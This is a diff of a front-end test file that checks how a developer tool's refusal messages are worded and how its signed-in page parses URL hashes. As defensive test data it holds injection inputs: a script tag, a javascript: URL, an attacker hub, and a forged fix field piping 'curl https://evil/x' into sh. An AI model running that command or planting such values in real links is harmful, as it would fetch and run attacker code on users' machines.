@@ -1,32 +1,39 @@
 import { render, screen } from '@testing-library/react'
 import { describe, expect, it } from 'vitest'
 import { installCommand } from '../../src/connectAgent.ts'
-import { refusalFrom, roleSentence } from '../../src/refusal.ts'
-import { signedInFromHash } from '../../src/pages/SignedIn.tsx'
+import { reasonSentence, refusalFrom, roleSentence } from '../../src/refusal.ts'
+import { isSignedInHash, signedInFromHash } from '../../src/pages/SignedIn.tsx'
 import { COMMAND, RefusalNotice } from '../../src/Refusal.tsx'
 import { WorkspaceError, workspaceError } from '../../src/workspace.ts'
 
 const HUB = 'https://dogfood.agentscm.dev'
+// The Hub's 403 for a role that is too low, as POST /v1/hub/tokens sends it.
+const INSUFFICIENT = { error: 'insufficient_role', login: 'brandonfla', repository: 'counterbranch/agentscm', visibility: 'public', has: 'read', needs: 'triage', message: 'brandonfla has Read on public repository counterbranch/agentscm; ask a repository owner for Triage or higher' }
 
 describe('refusalFrom', () => {
-  it('shows the Hub’s own sentence and fix as is', () => {
-    expect(refusalFrom({ error: { code: 'role_too_low', message: 'brandonfla has Read on public repo counterbranch/agentscm; ask an owner for Triage', fix: 'Ask an owner of counterbranch/agentscm for Triage' } })).toEqual({
-      code: 'role_too_low',
-      message: 'brandonfla has Read on public repo counterbranch/agentscm; ask an owner for Triage',
-      fix: 'Ask an owner of counterbranch/agentscm for Triage',
-    })
+  it('shows the Hub’s own sentence word for word', () => {
+    expect(refusalFrom(INSUFFICIENT)).toEqual({ code: 'insufficient_role', message: INSUFFICIENT.message, fix: null })
   })
 
-  it('composes the shared sentence from fields when the Hub sends no message', () => {
-    expect(refusalFrom({ error: 'role_too_low', login: 'brandonfla', role: 'read', visibility: 'public', repo: 'counterbranch/agentscm', needs: 'triage' })?.message).toBe(
-      roleSentence({ login: 'brandonfla', role: 'Read', visibility: 'public', repo: 'counterbranch/agentscm', needs: 'Triage' }),
-    )
-    expect(roleSentence({ login: 'a', role: 'Read', visibility: null, repo: 'o/r', needs: 'Triage' })).toBe('a has Read on repo o/r; ask an owner for Triage')
+  it('composes the same sentence from the fields when the message is missing', () => {
+    const bare = { ...INSUFFICIENT, message: undefined }
+    expect(refusalFrom(bare)?.message).toBe(INSUFFICIENT.message)
+    expect(refusalFrom({ ...bare, visibility: 'private', has: 'minimal_access', needs: 'reporter' })?.message).toBe('brandonfla has Minimal access on private repository counterbranch/agentscm; ask a repository owner for Reporter or higher')
+    expect(roleSentence({ login: 'a', has: 'None', visibility: 'internal', repo: 'o/r', needs: 'Developer' })).toBe('a has no access to internal repository o/r; ask a repository owner for Developer or higher')
   })
 
-  it('words a bare known code, and stays out of the way for unknown ones', () => {
-    expect(refusalFrom({ error: 'not_connected' })?.message).toMatch(/isn’t connected to this Hub/)
+  it('words every bare refusal code the CLI and tray share', () => {
+    for (const code of ['not_connected', 'forbidden', 'no_repository_role', 'not_allowed', 'user_disabled', 'login_failed', 'sign_in_required', 'device_revoked']) {
+      expect(refusalFrom({ error: code })?.message, code).toMatch(/;/)
+    }
+    expect(refusalFrom({ error: 'access_check_unavailable', repository: 'o/r' })?.message).toContain('access to o/r')
+    expect(refusalFrom({ error: 'permission_unavailable', provider: 'gitlab' })?.message).toMatch(/^GitLab didn’t answer/)
+    expect(reasonSentence('no_repository_role')).toMatch(/ask a repository owner to add you/)
+  })
+
+  it('stays out of the way for unknown codes and junk', () => {
     expect(refusalFrom({ error: 'something_new' })).toBeNull()
+    expect(refusalFrom({ error: 'constructor' })).toBeNull()
     expect(refusalFrom(null)).toBeNull()
     expect(refusalFrom({ error: 'Not A Code' })).toBeNull()
   })
@@ -39,14 +46,14 @@ describe('refusalFrom', () => {
 
   it('never says membership in the workspace fallbacks, and prefers the Hub’s words', () => {
     expect(workspaceError(new WorkspaceError(403, 'x'))).not.toMatch(/membership/i)
-    expect(workspaceError(new WorkspaceError(403, 'x', 'role_too_low', { code: 'role_too_low', message: 'a has Read on repo o/r; ask an owner for Triage', fix: null }))).toBe('a has Read on repo o/r; ask an owner for Triage')
+    expect(workspaceError(new WorkspaceError(403, 'x', 'insufficient_role', refusalFrom(INSUFFICIENT)))).toBe(INSUFFICIENT.message)
   })
 })
 
 describe('RefusalNotice', () => {
-  it('renders a command fix as a copyable command', () => {
-    render(<RefusalNotice refusal={{ code: 'session_expired', message: 'Your sign-in on this computer has ended; sign in again.', fix: 'agentscm hub login' }} />)
-    expect(screen.getByRole('alert').textContent).toContain('Your sign-in on this computer has ended')
+  it('renders a plain agentscm command fix as a copyable command', () => {
+    render(<RefusalNotice refusal={{ code: 'sign_in_required', message: 'This computer isn’t signed in to this Hub any more; choose Sign In in the AgentSCM menu bar app.', fix: 'agentscm hub login' }} />)
+    expect(screen.getByRole('alert').textContent).toContain('isn’t signed in')
     expect(screen.getByText('agentscm hub login').tagName).toBe('CODE')
     expect(screen.getByRole('button', { name: /copy/i })).toBeTruthy()
   })
@@ -63,35 +70,32 @@ describe('RefusalNotice', () => {
 })
 
 describe('signedInFromHash', () => {
+  const ok = '#/signed-in?status=signed_in&login=jhawlwut&provider=github&computer=Jonny%E2%80%99s%20MacBook&auto_connect=on'
+
+  it('recognises the landing route with or without the slash', () => {
+    expect(isSignedInHash(ok)).toBe(true)
+    expect(isSignedInHash('#signed-in?status=signed_in&login=a')).toBe(true)
+    expect(isSignedInHash('#home')).toBe(false)
+  })
+
   it('reads who signed in where', () => {
-    expect(signedInFromHash('#signed-in?login=jhawlwut&computer=Jonny%E2%80%99s%20MacBook', HUB)).toEqual({ kind: 'ok', hub: HUB, host: 'dogfood.agentscm.dev', login: 'jhawlwut', computer: 'Jonny’s MacBook' })
+    expect(signedInFromHash(ok, HUB)).toEqual({ kind: 'ok', hub: HUB, host: 'dogfood.agentscm.dev', login: 'jhawlwut', provider: 'GitHub', computer: 'Jonny’s MacBook', autoConnect: true })
+    expect(signedInFromHash(ok.replace('auto_connect=on', 'auto_connect=off'), HUB)).toMatchObject({ autoConnect: false })
   })
 
   it('refuses hostile or broken input instead of echoing it', () => {
-    expect(signedInFromHash('#signed-in?login=<script>', HUB).kind).toBe('invalid')
-    expect(signedInFromHash('#signed-in', HUB).kind).toBe('invalid')
+    expect(signedInFromHash('#/signed-in?status=signed_in&login=<script>', HUB).kind).toBe('invalid')
+    expect(signedInFromHash('#/signed-in', HUB).kind).toBe('invalid')
+    expect(signedInFromHash('#/signed-in?login=a', HUB).kind).toBe('invalid')
     // The Hub is always this page's own origin; a hub in the link is ignored.
-    expect(signedInFromHash('#signed-in?login=a&hub=javascript:alert(1)', HUB)).toMatchObject({ kind: 'ok', hub: HUB })
-    expect(signedInFromHash('#signed-in?login=a&hub=https://evil.example', HUB)).toMatchObject({ kind: 'ok', hub: HUB, host: 'dogfood.agentscm.dev' })
+    expect(signedInFromHash(`${ok}&hub=https://evil.example`, HUB)).toMatchObject({ kind: 'ok', hub: HUB, host: 'dogfood.agentscm.dev' })
   })
 
-  it('carries a refusal through to the page', () => {
-    const s = signedInFromHash('#signed-in?error=role_too_low&login=brandonfla&role=read&visibility=public&repo=counterbranch/agentscm&needs=triage', HUB)
-    expect(s).toMatchObject({ kind: 'refused', refusal: { message: 'brandonfla has Read on public repo counterbranch/agentscm; ask an owner for Triage' } })
-  })
-
-  it('never shows message or fix text from the link', () => {
-    const forged = signedInFromHash('#signed-in?error=x&message=Your+setup+is+broken&fix=npx+agentscm+repair+%26%26+curl+https://evil/x+|+sh', HUB)
-    expect(forged.kind).toBe('invalid')
-    const known = signedInFromHash('#signed-in?error=not_connected&message=Your+setup+is+broken&fix=npx+agentscm+repair', HUB)
-    expect(known.kind).toBe('refused')
-    if (known.kind !== 'refused') return
-    expect(known.refusal.message).not.toContain('broken')
-    expect(known.refusal.fix).not.toContain('repair')
-  })
-
-  it('does not treat object prototype names as known codes', () => {
-    expect(signedInFromHash('#signed-in?error=constructor', HUB).kind).toBe('invalid')
+  it('shows the shared sentence for a refusal reason, and nothing from the link', () => {
+    const s = signedInFromHash('#/signed-in?status=refused&reason=no_repository_role&message=Your+setup+is+broken&fix=npx+agentscm+repair+%26%26+curl+https://evil/x+|+sh', HUB)
+    expect(s).toMatchObject({ kind: 'refused', refusal: { code: 'no_repository_role', message: reasonSentence('no_repository_role'), fix: null } })
+    expect(signedInFromHash('#/signed-in?status=refused&reason=made_up', HUB).kind).toBe('invalid')
+    expect(signedInFromHash('#/signed-in?status=refused&reason=constructor', HUB).kind).toBe('invalid')
   })
 })
 
